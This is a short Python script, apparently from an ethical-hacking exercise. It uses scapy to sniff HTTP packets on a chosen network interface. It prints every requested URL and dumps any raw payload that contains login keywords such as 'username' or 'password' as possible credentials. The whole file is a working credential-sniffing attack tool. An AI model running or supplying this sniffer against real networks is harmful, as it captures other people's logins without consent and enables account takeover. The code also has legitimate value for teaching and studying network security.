#!usr/bin/env/python

import scapy.all as scapy
import optparse
from scapy.layers import http


def get_arguments():
    #parser = argparse.ArgumentParser()
    parser = optparse.OptionParser()
    parser.add_option("-i", "--interface", dest="interfaces", help="Interface to sniff to.")
    (option, argument) = parser.parse_args() # no arguments on argparser only option
    return option


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniff_packet)


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["username", "user", "usr", "login", "password", "pw", "pass", "uname"]
        keywords = [x.encode() for x in keywords]
        for keyword in keywords:
            if keyword in load:
                return load


def process_sniff_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        urls = get_url(packet)
        print(urls)
        login_info = get_login(packet)
        if login_info:
            print("\n\nPossible username/passwords: ")
            print(login_info)


sniff(get_arguments().interfaces)
